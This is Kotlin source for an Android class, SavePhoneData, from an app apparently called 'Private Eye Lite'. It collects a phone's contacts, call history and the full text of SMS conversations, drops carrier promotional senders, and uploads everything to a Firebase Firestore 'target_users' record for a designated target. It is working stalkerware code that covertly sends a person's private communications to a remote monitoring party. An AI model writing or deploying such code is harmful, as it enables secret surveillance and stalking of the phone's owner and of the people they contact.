package com.rashediqbal.privateeyelite

import android.annotation.SuppressLint
import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import java.text.SimpleDateFormat
import java.util.*
import kotlin.collections.HashMap

class SavePhoneData(val context: Context) {

    private val sessionManager = SessionManager(context)
    private val userData = sessionManager.getUser()
    private val db = Firebase.firestore
    private val batch = db.batch()
    private val targetDocuments = db.collection("target_users").document(userData["target"]!!)


    fun saveData(){

        val contactsMap = getContacts()
        val callsMap = getCalls()
        val conversationMap = getConversations()

        if (sessionManager.isFirstTime()){
            batch.set(
                targetDocuments.collection("data").document("contacts"),
                contactsMap as Map<String, Any>
            )
            batch.set(
                targetDocuments.collection("data").document("calls"),
                callsMap as Map<String, Any>
            )
            batch.set(
                targetDocuments.collection("data").document("conversations"),
                conversationMap as Map<String, Any>
            )
            batch.update(targetDocuments,"last_update",getCurrentTime())

            batch.commit().addOnSuccessListener {
                sessionManager.setFirstTime(false)
            }
        } else {
            batch.update(
                targetDocuments.collection("data").document("contacts"),
                contactsMap as Map<String, Any>
            )
            batch.update(
                targetDocuments.collection("data").document("calls"),
                callsMap as Map<String, Any>
            )
            batch.update(
                targetDocuments.collection("data").document("conversations"),
                conversationMap as Map<String, Any>
            )
            batch.update(targetDocuments,"last_update",getCurrentTime())

            batch.commit().addOnSuccessListener {
                Log.d("Upload","Success")
            }
        }
    }

    private fun getCurrentTime(): String {
        val simpleDateFormat = SimpleDateFormat("yyyy.MMMM.dd GGG hh:mm aaa")
        return simpleDateFormat.format(Date())
    }

    @SuppressLint("Range")
    private fun getContacts(): HashMap<String, Any> {
        val map = HashMap<String, Any>()
        val contentResolver = context.contentResolver
        val uri: Uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI
        val cursor: Cursor? = contentResolver.query(uri, null, null, null, null)

        Log.i("MY_CONTACTS", "TotalContacts ${cursor!!.count}")

        if (cursor.count > 0) {
            while (cursor.moveToNext()) {
                val contactName =
                    cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                val contactNumber =
                    cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))

                val id =
                    cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_ID))
                val hashMap = hashMapOf<String, Any>(
                    "name" to contactName,
                    "number" to contactNumber,
                )
                map[id] = hashMap
            }
            cursor.close()
        }

        return map
    }

    @SuppressLint("Range")
    private fun getCalls(): HashMap<String, Any> {
        val map = HashMap<String, Any>()

        val contentResolver = context.contentResolver
        val uri: Uri = CallLog.Calls.CONTENT_URI
        val cursor: Cursor? =
            contentResolver.query(uri, null, getSelection(CallLog.Calls.DATE), null, null)

        Log.i("MY_CALLS", "TotalCalls ${cursor!!.count}")

        if (cursor.count > 0) {
            while (cursor.moveToNext()) {
                val number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER))
                val getName = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME))
                val name = if (getName == null || getName == "") "Unknown" else getName
                val type = when (cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE))) {
                    "1" -> "Incoming"
                    "2" -> "Outgoing"
                    "3" -> "Missed"
                    else -> "None"
                }
                val id = cursor.getString(cursor.getColumnIndex(CallLog.Calls._ID))
                val date = cursor.getString(cursor.getColumnIndex(CallLog.Calls.DATE))
                val hashMap = hashMapOf<String, Any>(
                    "name" to name,
                    "number" to number,
                    "type" to type,
                    "date" to date
                )
                map[id] = hashMap
//                Log.i("MY_CALLS","Id: $id Name: $name, Number: $number Type: $type Date: $date")
            }
            cursor.close()
        }
        return map
    }

    private fun getSelection(date: String): String? {
        val calendar = Calendar.getInstance()
        calendar.set(Calendar.HOUR, 0)
        calendar.set(Calendar.MINUTE, 0)
        calendar.set(Calendar.AM_PM, Calendar.AM)

        return if (!sessionManager.isFirstTime()) {
            date + ">" + calendar.timeInMillis
        } else {
            null
        }
    }

    @SuppressLint("Range")
    private fun getConversations(): HashMap<String, Any> {

        val conversationMap = HashMap<String, Any>()

        val conversationUri = Telephony.Sms.Conversations.CONTENT_URI
        val conversationProjection = arrayOf("msg_count", "snippet", "thread_id")
        val conversationCursor: Cursor? = context.contentResolver.query(
            conversationUri,
            conversationProjection,
            getSelection(Telephony.Sms.DATE),
            null,
            Telephony.Sms.Conversations.DEFAULT_SORT_ORDER
        )
        if (conversationCursor!!.count > 0) {
            while (conversationCursor.moveToNext()) {

                val msgCount =
                    conversationCursor.getInt(conversationCursor.getColumnIndex("msg_count"))
                val snippet =
                    conversationCursor.getString(conversationCursor.getColumnIndex("snippet"))
                val threadId =
                    conversationCursor.getString(conversationCursor.getColumnIndex("thread_id"))

                val messageUri = Telephony.Sms.CONTENT_URI
                val messageProjection = arrayOf(
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.TYPE,
                    Telephony.Sms.DATE,
                    Telephony.Sms._ID
                )

                val messageCursor: Cursor? = context.contentResolver.query(
                    messageUri,
                    messageProjection,
                    getMessageSelection(Telephony.Sms.DATE,"thread_id=$threadId"),
                    null,
                    null
                )

                messageCursor!!.moveToFirst()
                val address = messageCursor.getString(0)
                val date = messageCursor.getString(3)
//                val newDate = DateFormat.format("hh:mm", date.toLong()).toString()
                val messageMap = HashMap<String, Any>()

                if (validateAddress(address)) {

                    if (messageCursor.count > 0) {
                        do {

                            val hashMap = hashMapOf<String, Any>(
                                "address" to messageCursor.getString(0),
                                "body" to messageCursor.getString(1),
                                "type" to messageCursor.getString(2),
                                "date" to messageCursor.getString(3)
                            )
                            messageMap[messageCursor.getString(4)] = hashMap

                            if (messageCursor.isLast) {
                                break
                            }
                        } while (messageCursor.moveToNext())
                        messageCursor.close()
                    }

                    val hashMap = hashMapOf<String, Any>(
                        "address" to address,
                        "snippet" to snippet,
                        "date" to date,
                        "tid" to threadId,
                        "msgCount" to msgCount,
                        "messages" to messageMap
                    )

                    conversationMap[threadId] = hashMap
                }

                Log.d(
                    "MY_CONVERSATIONS",
                    "Conversation: $conversationMap"
                )
            }
            conversationCursor.close()
        }
        return conversationMap
    }

    private fun getMessageSelection(date: String, idCheck: String): String? {

        val calendar = Calendar.getInstance()
        calendar.set(Calendar.HOUR, 0)
        calendar.set(Calendar.MINUTE, 0)
        calendar.set(Calendar.AM_PM, Calendar.AM)

        return if (!sessionManager.isFirstTime()){
            "$date>${calendar.timeInMillis} AND $idCheck"
        } else {
            idCheck
        }
    }

    private fun validateAddress(address: String): Boolean {
        return (address != "WhatsApp" && address != "bKash Offer" && address != "GP Bioscope" && address != "MyGP Zee5"
                && address != "GP ID" && address != "BTRC" && address != "GP 4G" && address != "GP " && address != "GP Bundle"
                && address != "GP" && address != "Offer Info" && address != "GP offer" && address != "Skitto" && address != "GP  "
                && address != "GPDataOffer" && address != "GP Internet" && address != "GPFlexiPlan" && address != "GP Info" && address != "skitto"
                && !address.startsWith("GP"))
    }


}